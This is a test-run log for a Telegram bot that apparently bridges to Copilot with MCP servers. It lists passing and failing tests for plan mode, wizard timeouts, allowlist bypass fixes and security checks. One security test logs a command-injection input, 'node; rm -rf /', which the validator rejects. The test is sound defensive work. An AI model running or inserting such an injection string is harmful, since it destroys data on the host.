[31m     Ã”Ã¥Ã† Failed to load url ../src/bot/commands (resolved id: ../src/bot/commands) in D:/Juanma/MCP Copilot Telegram/tests/commands-reset.test.ts. Does the file exist?[39m
 [32mÃ”Â£Ã´[39m tests/allowlist-bypass-fix.test.ts [2m ([22m[2m7 tests[22m[2m)[22m[90m 20[2mms[22m[39m
[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mSessionManager plan mode tracking[2m > [22m[2mshould track plan mode state per user[22m[39m
2026-02-12T17:11:44.877Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:44.884Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":false}

[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mSessionManager plan mode tracking[2m > [22m[2mshould handle multiple users independently[22m[39m
2026-02-12T17:11:44.923Z [[32minfo[39m]: Plan mode state changed {"userId":"user1","active":true}
2026-02-12T17:11:44.925Z [[32minfo[39m]: Plan mode state changed {"userId":"user2","active":true}
2026-02-12T17:11:44.925Z [[32minfo[39m]: Plan mode state changed {"userId":"user1","active":false}

[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mSessionManager plan mode tracking[2m > [22m[2mshould exit plan mode and destroy session[22m[39m
2026-02-12T17:11:45.025Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:45.027Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:45.027Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:45.028Z [[32minfo[39m]: Exiting plan mode {"userId":"user123","hasActiveProject":true}
2026-02-12T17:11:45.029Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":3}
2026-02-12T17:11:45.030Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}
2026-02-12T17:11:45.030Z [[32minfo[39m]: Plan mode exited, session destroyed for recreation {"userId":"user123","projectPath":"C:\\temp\\project"}

[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mSessionManager plan mode tracking[2m > [22m[2mshould not recreate session if no active session exists when exiting plan mode[22m[39m
2026-02-12T17:11:45.066Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:45.067Z [[32minfo[39m]: Exiting plan mode {"userId":"user123","hasActiveProject":false}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mAllowlistSetupWizard[2m > [22m[2mshould cleanup wizard session after TTL expires[22m[39m
2026-02-12T17:11:44.684Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456}
2026-02-12T17:16:44.684Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"telegramId":123456,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mAllowlistSetupWizard[2m > [22m[2mshould update lastActivity on input and extend TTL[22m[39m
2026-02-12T17:11:44.970Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456}
2026-02-12T17:14:44.970Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456,"input":""}
2026-02-12T17:19:44.970Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"telegramId":123456,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mAllowlistSetupWizard[2m > [22m[2mshould log cleanup event[22m[39m
2026-02-12T17:11:44.974Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456}
2026-02-12T17:16:44.974Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"telegramId":123456,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mAllowlistSetupWizard[2m > [22m[2mshould not cleanup if wizard completes normally[22m[39m
2026-02-12T17:11:44.991Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456}
2026-02-12T17:11:44.991Z [[32minfo[39m]: Allowlist setup wizard cancelled {"telegramId":123456}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mAllowlistSetupWizard[2m > [22m[2mshould handle multiple users independently[22m[39m
2026-02-12T17:11:44.995Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":111111}
2026-02-12T17:11:44.995Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":222222}
2026-02-12T17:16:44.995Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"telegramId":111111,"ttlMs":300000,"elapsedMs":300000}
2026-02-12T17:16:44.995Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"telegramId":222222,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mServerWizard[2m > [22m[2mshould cleanup wizard session after TTL expires[22m[39m
2026-02-12T17:11:45.000Z [[32minfo[39m]: Wizard started {"userId":123456}
2026-02-12T17:16:45.000Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"userId":123456,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mServerWizard[2m > [22m[2mshould update lastActivity on input and extend TTL[22m[39m
2026-02-12T17:11:45.004Z [[32minfo[39m]: Wizard started {"userId":123456}
2026-02-12T17:19:45.004Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"userId":123456,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mServerWizard[2m > [22m[2mshould log cleanup event[22m[39m
2026-02-12T17:11:45.009Z [[32minfo[39m]: Wizard started {"userId":123456}
2026-02-12T17:16:45.009Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"userId":123456,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mServerWizard[2m > [22m[2mshould not cleanup if wizard completes normally[22m[39m
2026-02-12T17:11:45.019Z [[32minfo[39m]: Wizard started {"userId":123456}
2026-02-12T17:11:45.019Z [[32minfo[39m]: Wizard cancelled {"userId":123456}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mServerWizard[2m > [22m[2mshould handle multiple users independently[22m[39m
2026-02-12T17:11:45.024Z [[32minfo[39m]: Wizard started {"userId":111111}
2026-02-12T17:11:45.024Z [[32minfo[39m]: Wizard started {"userId":222222}
2026-02-12T17:16:45.024Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"userId":111111,"ttlMs":300000,"elapsedMs":300000}
2026-02-12T17:16:45.024Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"userId":222222,"ttlMs":300000,"elapsedMs":300000}

[90mstdout[2m | tests/wizard-ttl-cleanup.test.ts[2m > [22m[2mWizard TTL Cleanup[2m > [22m[2mServerWizard[2m > [22m[2mshould use configurable TTL constant[22m[39m
2026-02-12T17:11:45.075Z [[32minfo[39m]: Wizard started {"userId":123456}
2026-02-12T17:16:45.075Z [[32minfo[39m]: Wizard session cleaned up due to TTL expiration {"userId":123456,"ttlMs":300000,"elapsedMs":300000}

 [31mÃ”Ã˜Â»[39m tests/wizard-ttl-cleanup.test.ts [2m ([22m[2m12 tests[22m [2m|[22m [31m2 failed[39m[2m)[22m[33m 400[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Wizard TTL Cleanup[2m > [22mAllowlistSetupWizard[2m > [22mshould log cleanup event[39m
[31m     Ã”Ã¥Ã† expected "log" to be called at least once[39m
[31m   [31mâ”œÃ¹[31m Wizard TTL Cleanup[2m > [22mServerWizard[2m > [22mshould log cleanup event[39m
[31m     Ã”Ã¥Ã† expected "log" to be called at least once[39m
[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mSessionManager plan mode tracking[2m > [22m[2mshould clear plan mode flags when destroying all sessions[22m[39m
2026-02-12T17:11:45.134Z [[32minfo[39m]: Creating new session {"userId":"user1","projectPath":"C:\\temp\\project1","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:45.135Z [[32minfo[39m]: Session created successfully {"userId":"user1","projectPath":"C:\\temp\\project1","sessionCount":1}
2026-02-12T17:11:45.136Z [[32minfo[39m]: Creating new session {"userId":"user2","projectPath":"C:\\temp\\project2","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:45.136Z [[32minfo[39m]: Session created successfully {"userId":"user2","projectPath":"C:\\temp\\project2","sessionCount":1}
2026-02-12T17:11:45.137Z [[32minfo[39m]: Plan mode state changed {"userId":"user1","active":true}
2026-02-12T17:11:45.137Z [[32minfo[39m]: Plan mode state changed {"userId":"user2","active":true}

[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mSessionManager plan mode tracking[2m > [22m[2mshould clear plan mode when destroying a specific session[22m[39m
2026-02-12T17:11:45.182Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:45.182Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:45.183Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:45.184Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":1}
2026-02-12T17:11:45.184Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}

[90mstdout[2m | tests/plan-mode.test.ts[2m > [22m[2mPlan Mode State Management[2m > [22m[2mPlan mode persistence[2m > [22m[2mshould maintain plan mode when switching projects[22m[39m
2026-02-12T17:11:45.226Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project1","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:45.227Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project1","sessionCount":1}
2026-02-12T17:11:45.227Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:45.228Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project2","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:45.228Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project2","sessionCount":2}

 [32mÃ”Â£Ã´[39m tests/plan-mode.test.ts [2m ([22m[2m7 tests[22m[2m)[22m[33m 585[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/race-condition-fix.test.ts [2m ([22m[2m22 tests[22m [2m|[22m [31m3 failed[39m[2m)[22m[90m 88[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Race Condition Fix - Timeout Extension Mutex[2m > [22mMutex Infrastructure[2m > [22mshould have timeoutExtensionLocks Map declared[39m
[31m     Ã”Ã¥Ã† expected 'import { Bot, Context } from \'grammyÃ”Ã‡Âª' to contain 'timeoutExtensionLocks'[39m
[31m   [31mâ”œÃ¹[31m Race Condition Fix - Timeout Extension Mutex[2m > [22mMutex Infrastructure[2m > [22mshould check if lock is already held before acquiring[39m
[31m     Ã”Ã¥Ã† expected 'function acquireExtensionLock(userId:Ã”Ã‡Âª' to match /timeoutExtensionLocks\.get\(userId\)/[39m
[31m   [31mâ”œÃ¹[31m Race Condition Fix - Timeout Extension Mutex[2m > [22mMutex Infrastructure[2m > [22mshould delete lock in releaseExtensionLock[39m
[31m     Ã”Ã¥Ã† expected 'function releaseExtensionLock(userId:Ã”Ã‡Âª' to contain 'timeoutExtensionLocks.delete(userId)'[39m
[90mstdout[2m | tests/allowlist-wizard-id-consistency.test.ts[2m > [22m[2mAllowlistSetupWizard - ID Consistency[2m > [22m[2mID Consistency Throughout Wizard Flow[2m > [22m[2mshould use Telegram ID consistently in setup initiation[22m[39m
2026-02-12T17:11:45.389Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}

[90mstdout[2m | tests/allowlist-wizard-id-consistency.test.ts[2m > [22m[2mAllowlistSetupWizard - ID Consistency[2m > [22m[2mID Consistency Throughout Wizard Flow[2m > [22m[2mshould handle input with Telegram ID and not create duplicate users[22m[39m
2026-02-12T17:11:45.406Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:45.408Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:45.409Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-wizard-id-consistency.test.ts[2m > [22m[2mAllowlistSetupWizard - ID Consistency[2m > [22m[2mID Consistency Throughout Wizard Flow[2m > [22m[2mshould complete full wizard flow without ID mismatches[22m[39m
2026-02-12T17:11:45.412Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:45.412Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:45.413Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-wizard-id-consistency.test.ts[2m > [22m[2mAllowlistSetupWizard - ID Consistency[2m > [22m[2mID Consistency Throughout Wizard Flow[2m > [22m[2mshould not recognize wizard state when different IDs are mixed[22m[39m
2026-02-12T17:11:45.416Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}

[90mstdout[2m | tests/allowlist-wizard-id-consistency.test.ts[2m > [22m[2mAllowlistSetupWizard - ID Consistency[2m > [22m[2mIntegration with UserState[2m > [22m[2mshould correctly map Telegram ID to DB operations[22m[39m
2026-02-12T17:11:45.420Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:45.421Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:45.422Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-wizard-id-consistency.test.ts[2m > [22m[2mAllowlistSetupWizard - ID Consistency[2m > [22m[2mEdge Cases[2m > [22m[2mshould handle concurrent wizards for different users[22m[39m
2026-02-12T17:11:45.429Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:45.430Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":111222333}
2026-02-12T17:11:45.431Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Test"}
2026-02-12T17:11:45.431Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

 [32mÃ”Â£Ã´[39m tests/allowlist-wizard-id-consistency.test.ts [2m ([22m[2m9 tests[22m[2m)[22m[90m 61[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/timeout-config-phase1.test.ts [2m ([22m[2m20 tests[22m[2m)[22m[33m 722[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/integration/telegram-e2e.test.ts [2m ([22m[2m19 tests[22m [2m|[22m [31m19 failed[39m[2m)[22m[33m 12669[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mBasic Flow[2m > [22mshould handle complete conversation flow: /start Ã”Ã¥Ã† /cd Ã”Ã¥Ã† message Ã”Ã¥Ã† response[39m
[31m     Ã”Ã¥Ã† expected 'Ã”Â£Ã  Copilot Telegram Bot iniciado\n\nÂ­Æ’Ã´Ã©Ã”Ã‡Âª' to contain 'Bienvenido'[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mBasic Flow[2m > [22mshould reject /cd to non-allowed path[39m
[31m     Ã”Ã¥Ã† expected 'Ã”Ã˜Ã® Ruta no permitida por ALLOWED_PATHS.' to contain 'no estâ”œÃ­ permitida'[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mBasic Flow[2m > [22mshould handle /status command showing current state[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mPlan Mode Flow[2m > [22mshould activate and deactivate plan mode: /plan Ã”Ã¥Ã† approval Ã”Ã¥Ã† /exitplan[39m
[31m     Ã”Ã¥Ã† Test timed out in 5000ms.
If this is a long-running test, pass a timeout value as the last argument or configure it globally with "testTimeout".[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mPlan Mode Flow[2m > [22mshould handle /plan without task text[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mPlan Mode Flow[2m > [22mshould exit plan mode when changing directory with /cd[39m
[31m     Ã”Ã¥Ã† Test timed out in 5000ms.
If this is a long-running test, pass a timeout value as the last argument or configure it globally with "testTimeout".[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mPlan Mode Flow[2m > [22mshould prevent concurrent operations when busy[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mWizard Flow[2m > [22mshould handle MCP wizard cancellation flow[39m
[31m     Ã”Ã¥Ã† userState.getOrCreate is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mWizard Flow[2m > [22mshould complete full MCP wizard flow for STDIO server[39m
[31m     Ã”Ã¥Ã† userState.getOrCreate is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mWizard Flow[2m > [22mshould handle wizard timeout after 5 minutes of inactivity[39m
[31m     Ã”Ã¥Ã† userState.getOrCreate is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mError Recovery[2m > [22mshould handle session recreation after network failure[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mError Recovery[2m > [22mshould handle message sending with retry on network failure[39m
[31m     Ã”Ã¥Ã† Message handler not registered[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mError Recovery[2m > [22mshould handle AbortController cancellation cleanly[39m
[31m     Ã”Ã¥Ã† sessionManager.setCancelled is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mError Recovery[2m > [22mshould clear cancellation state after operation completes[39m
[31m     Ã”Ã¥Ã† sessionManager.setCancelled is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mError Recovery[2m > [22mshould handle concurrent stop commands gracefully[39m
[31m     Ã”Ã¥Ã† sessionManager.setCancelled is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mModel Selection[2m > [22mshould handle model selection via callback[39m
[31m     Ã”Ã¥Ã† expected 'gpt-5' to be 'claude-opus-4.6' // Object.is equality[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mMCP Server Management[2m > [22mshould list MCP servers[39m
[31m     Ã”Ã¥Ã† userState.getOrCreate is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mMCP Server Management[2m > [22mshould handle MCP server enable/disable toggle[39m
[31m     Ã”Ã¥Ã† userState.getOrCreate is not a function[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
[31m   [31mâ”œÃ¹[31m E2E Bot Tests[2m > [22mSession Reset[2m > [22mshould handle /reset command and clear session[39m
[31m     Ã”Ã¥Ã† expected 'Ã”Ã¤â•£Â´Â©Ã… No hay sesiâ”œâ”‚n activa que reiniciar' to contain 'Sesiâ”œâ”‚n reiniciada'[39m
[31m     Ã”Ã¥Ã† sessionManager.clearAll is not a function[39m
 [32mÃ”Â£Ã´[39m tests/cross-platform.test.ts [2m ([22m[2m18 tests[22m[2m)[22m[90m 30[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/types-errors.test.ts [2m ([22m[2m34 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 47[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Error Conversion Functions[2m > [22mtoErrorWithMessage[2m > [22mshould convert undefined to Error[39m
[31m     Ã”Ã¥Ã† expected '' to be 'undefined' // Object.is equality[39m
 [31mÃ”Ã˜Â»[39m tests/atomic-lock-integration.test.ts [2m ([22m[2m8 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 5246[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Message Handler - Timeout Extension Lock Integration[2m > [22mMemory Leak Prevention[2m > [22mshould not leak locks over many extension cycles[39m
[31m     Ã”Ã¥Ã† Test timed out in 5000ms.
If this is a long-running test, pass a timeout value as the last argument or configure it globally with "testTimeout".[39m
 [31mÃ”Ã˜Â»[39m tests/types-sanitize.test.ts [2m ([22m[2m26 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 43[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Sanitization Types[2m > [22misJsonValue[2m > [22mshould handle Date objects (returns false as not JSON-serializable)[39m
[31m     Ã”Ã¥Ã† expected true to be false // Object.is equality[39m
 [31mÃ”Ã˜Â»[39m tests/allowlist-bypass-commands-fix.test.ts [2m ([22m[2m10 tests[22m [2m|[22m [31m10 failed[39m[2m)[22m[90m 50[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22m/plan command security[2m > [22mshould block /plan when cwd is not in allowlist[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22m/plan command security[2m > [22mshould allow /plan when cwd is in allowlist[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22m/exitplan command security[2m > [22mshould block /exitplan when cwd is not in allowlist[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22m/exitplan command security[2m > [22mshould allow /exitplan when cwd is in allowlist[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22mBypass scenarios for plan commands[2m > [22mshould block /plan with configured DB but empty .env allowlist[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22mBypass scenarios for plan commands[2m > [22mshould block /exitplan with configured DB but empty .env allowlist[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22mIntegration with existing security checks[2m > [22mshould maintain existing /cd security checks[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22mIntegration with existing security checks[2m > [22mshould maintain existing /switch security checks[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22mIntegration with existing security checks[2m > [22mshould maintain existing callback security checks[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[31m   [31mâ”œÃ¹[31m Allowlist Bypass Fix - /plan and /exitplan Commands[2m > [22mComplete security coverage verification[2m > [22mall switchProject calls should have allowlist validation[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts[39m
[31m     Ã”Ã¥Ã† Cannot read properties of undefined (reading 'join')[39m
[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould create complete STDIO server with quoted arguments safely[22m[39m
2026-02-12T17:11:46.199Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:46.448Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"secure-server","serverType":"stdio"}

[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould create HTTP server with strict protocol validation[22m[39m
2026-02-12T17:11:46.453Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:46.455Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"http-server","serverType":"http"}

[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould reject invalid protocols in wizard flow[22m[39m
2026-02-12T17:11:46.458Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould handle complex argument parsing scenarios[22m[39m
2026-02-12T17:11:46.462Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould access service through public API without type casting[22m[39m
2026-02-12T17:11:46.692Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"via-public-api","serverType":"stdio"}

[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould prevent command injection in validation[22m[39m
2026-02-12T17:11:46.696Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node; rm -rf /"}

[90mstdout[2m | tests/security-integration.test.ts[2m > [22m[2mSecurity Fixes Integration Tests[2m > [22m[2mshould handle all security scenarios in end-to-end flow[22m[39m
2026-02-12T17:11:46.700Z [[32minfo[39m]: Wizard started {"userId":1}
